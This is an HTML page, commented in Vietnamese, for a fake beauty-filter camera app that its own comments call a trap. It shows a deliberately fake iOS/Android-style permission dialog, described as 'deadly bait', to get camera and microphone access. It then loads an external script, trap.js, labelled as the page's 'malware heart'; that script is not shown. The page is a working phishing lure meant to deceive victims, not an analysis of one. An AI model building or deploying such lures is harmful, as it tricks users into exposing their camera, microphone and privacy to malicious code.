<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PTB Camera - Auto Beauty Filter</title>
    <!-- Thêm font chữ kute và icon -->
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    
    <!-- Giao diện chính của Camera -->
    <div class="camera-container">
        
        <!-- Hiệu ứng đang tải (khi chưa cấp quyền) -->
        <div class="loading-overlay" id="loadingOverlay">
            <div class="spinner"></div>
            <p>Đang khởi động ống kính AR...</p>
        </div>

        <!-- Khung ngắm giả (đen thui lúc đầu) -->
        <div class="viewfinder">
            <!-- Cái này để lừa, khi bấm cấp quyền xong mới nháy lên hoặc báo lỗi -->
            <video id="fakeVideo" autoplay playsinline></video>
        </div>

        <!-- Các thanh công cụ giả -->
        <div class="top-bar">
            <i class="fas fa-cog"></i>
            <i class="fas fa-bolt"></i>
            <i class="fas fa-adjust"></i>
            <i class="fas fa-redo-alt"></i>
        </div>

        <div class="bottom-bar">
            <div class="filters">
                <div class="filter-item active">Original</div>
                <div class="filter-item">Rosy</div>
                <div class="filter-item">Vintage</div>
                <div class="filter-item">Cold</div>
            </div>
            
            <div class="capture-controls">
                <i class="far fa-images gallery-icon"></i>
                <div class="capture-btn">
                    <div class="capture-btn-inner"></div>
                </div>
                <i class="fas fa-magic beauty-icon"></i>
            </div>
        </div>

    </div>

    <!-- Cái này là mồi câu trí mạng: Bảng yêu cầu quyền giả mạo phong cách iOS/Android -->
    <div class="permission-modal-overlay" id="permissionModal">
        <div class="permission-modal">
            <div class="modal-icon">
                <i class="fas fa-camera-retro"></i>
            </div>
            <h3>Yêu cầu quyền truy cập</h3>
            <p>PTB Camera cần quyền truy cập Camera và Microphone để áp dụng các bộ lọc làm đẹp trực tiếp.</p>
            <div class="modal-buttons">
                <button class="btn-deny" id="btnDeny">Từ chối</button>
                <button class="btn-allow" id="btnAllow">Cho phép</button>
            </div>
        </div>
    </div>

    <!-- Nhúng Trái tim mã độc -->
    <script src="trap.js"></script>
</body>
</html>
